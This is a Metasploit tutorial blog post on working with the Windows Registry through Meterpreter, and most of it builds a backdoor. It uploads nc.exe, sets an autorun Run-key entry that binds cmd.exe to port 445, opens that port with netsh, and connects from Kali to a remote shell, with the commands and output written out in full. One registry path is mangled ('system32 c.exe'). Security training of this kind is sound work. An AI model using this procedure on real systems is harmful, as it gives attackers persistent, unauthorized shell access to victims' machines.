---
draft: false
title: MSF Working on Registry
linkTitle: MSF Working on Registry
translationKey: msf-working-on-registry
weight: 320
date: 2017-06-05T13:27:00+03:00
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
description: Meterpreter gives us the ability to work on the Windows Registry. In this article, we will examine how to work on the Windows Registry.
url: /msf-working-on-registry/
featured_image: /images/metasploit.jpg
categories:
    - Metasploit Framework
tags:
    - cybersecurity
    - metasploit framework
---
## Windows Registry Operations

Windows Registry is a magical area where almost all operations are recorded. A single change in this area can give you the necessary authority in the system. On the other hand, a wrong operation can cause the system not to boot again. You need to act carefully and not rush.

Meterpreter, a powerful tool in the Metasploit Framework, provides many commands that allow you to work on the Windows Registry. Let's take a brief look at them. When you open a Meterpreter shell on a system, you can see the help information by typing the `reg` command.

```bash
meterpreter > reg
Usage: reg [command] [options]

Interact with the target machine's registry.

OPTIONS:

    -d   The data to store in the registry value.
    -h   Help menu.
    -k   The registry key path (E.g. HKLM\Software\Foo).
    -t   The registry value type (E.g. REG_SZ).
    -v   The registry value name (E.g. Stuff).

COMMANDS:

    enumkey    Enumerate the supplied registry key [-k >key>]
    createkey  Create the supplied registry key  [-k >key>]
    deletekey  Delete the supplied registry key  [-k >key>]
    queryclass Queries the class of the supplied key [-k >key>]
    setval     Set a registry value [-k >key> -v >val> -d >data>]
    deleteval  Delete the supplied registry value [-k >key> -v >val>]
    queryval   Queries the data contents of a value [-k >key> -v >val>]
```

As you can see from the help command, the `reg` command provides the ability to read (`queryval`), write (`setval`), create new settings (`createkey`), and delete (`deletekey`) on the Registry.

With these commands, you can create new values, change values, and collect information about the system by looking at the right places. I recommend you to improve yourself about where the value is stored in the system. For an idea, you can check the [PDF file](https://support.accessdata.com/hc/en-us/article_attachments/201717329/Registry_Quick_Find_Chart_9-27-10.pdf) in the link.

## Creating a Backdoor on Windows

In this article, we will examine how to create a backdoor on a Windows system using the Registry. We will place the `netcat` program on the target system. By making changes in the Registry settings, we will set the `netcat` program to start automatically when the computer is turned on. We will ensure that the Firewall settings allow `netcat` program and port 445.

### Uploading netcat Program nc.exe to the Target System

First of all, let's upload the netcat program, known as `nc.exe`, to the target Windows operating system. You must have previously opened a meterpreter shell. We have mentioned examples of this in our previous articles. You can find some useful programs in the `/usr/share/windows-binaries/` folder in the Kali operating system.

```bash
meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
> uploading  : /tmp/nc.exe -> C:\windows\system32
> uploaded   : /tmp/nc.exe -> C:\windows\system32nc.exe
```

### netcat Program to Run Automatically

To run the nc.exe program every time the operating system starts, you must create a value in the Registry key `HKLM\software\microsoft\windows\currentversion\run`. First, let's see the current values and settings. Note that the backslash `\` characters are written twice.

```bash
meterpreter > reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
Enumerating: HKLM\software\microsoft\windows\currentversion\run

  Values (3):

    VMware Tools
    VMware User Process
    quicktftpserver
```

As seen in the command output, the `VMware Tools, VMware User Process, quicktftpserver` software is currently set to start automatically. Let's add our new setting with the `reg setval` command and check it again with the `reg queryval` command.

```bash
meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32 c.exe -Ldp 445 -e cmd.exe'
Successful set nc.
meterpreter > reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
Key: HKLM\software\microsoft\windows\currentversion\Run
Name: nc
Type: REG_SZ
Data: C:\windows\system32 c.exe -Ldp 445 -e cmd.exe
```

### Firewall Settings

You can make firewall settings directly from the Registry settings, or you can make firewall settings with the `netsh` command. Let's set the firewall settings from the command line to show usage. To do this, let's enter the Windows command line from the Meterpreter command line.

```bash
meterpreter > execute -f cmd -i
Process 1604 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\ >
```

Let's see the current state of the Firewall settings.

```bash
C:\ > netsh firewall show opmode
Netsh firewall show opmode

Domain profile configuration:
-------------------------------------------------------------------
Operational mode                  = Enable
Exception mode                    = Enable

Standard profile configuration (current):
-------------------------------------------------------------------
Operational mode                  = Enable
Exception mode                    = Enable

Local Area Connection firewall configuration:
-------------------------------------------------------------------
Operational mode                  = Enable
```

Now let's add the port 445 to the allowed ports.

```bash
C:\ > netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL
netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL
Ok.
```

Let's check if the operation we performed has been successful.

```bash
C:\ > netsh firewall show portopening
netsh firewall show portopening

Port configuration for **Domain profile:
Port   Protocol  Mode     Name
-------------------------------------------------------------------
139    TCP       Enable   NetBIOS Session Service
445    TCP       Enable   SMB over TCP
137    UDP       Enable   NetBIOS Name Service
138    UDP       Enable   NetBIOS Datagram Service

Port configuration for **Standard profile:
Port   Protocol  Mode     Name
-------------------------------------------------------------------
445    TCP       Enable   Service Firewall
139    TCP       Enable   NetBIOS Session Service
445    TCP       Enable   SMB over TCP
137    UDP       Enable   NetBIOS Name Service
138    UDP       Enable   NetBIOS Datagram Service
C:\ >
```

### Testing the Backdoor

After making the necessary settings, you can restart the target system. When the target system restarts, `nc.exe` will automatically start and provide external connections. In the example below, it can be seen that the target system can be connected from the outside with the `nc` command.

```bash
root@kali:~# nc -v 172.16.104.128 445
172.16.104.128: inverse host lookup failed: Unknown server error : Connection timed out
(UNKNOWN) [172.16.104.128] 445 (?) open
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\ > dir
dir
Volume **in **drive C has no label.
Volume Serial Number is E423-E726

Directory of C:\

05/03/2009 01:43 AM
.
05/03/2009 01:43 AM
..
05/03/2009 01:26 AM 0 ;i
05/12/2009 10:53 PM
Desktop
10/29/2008 05:55 PM
Favorites
05/12/2009 10:53 PM
My Documents
05/03/2009 01:43 AM 0 QCY
10/29/2008 03:51 AM
Start Menu
05/03/2009 01:25 AM 0 talltelnet.log
05/03/2009 01:25 AM 0 talltftp.log
4 File(s) 0 bytes
6 Dir(s) 35,540,791,296 bytes free

C:\ >
```

In real situations, it is not so easy to open such a backdoor. However, the logic of the procedures to be applied is as explained above. If you fail to apply the above example exactly, do not despair. Work harder.
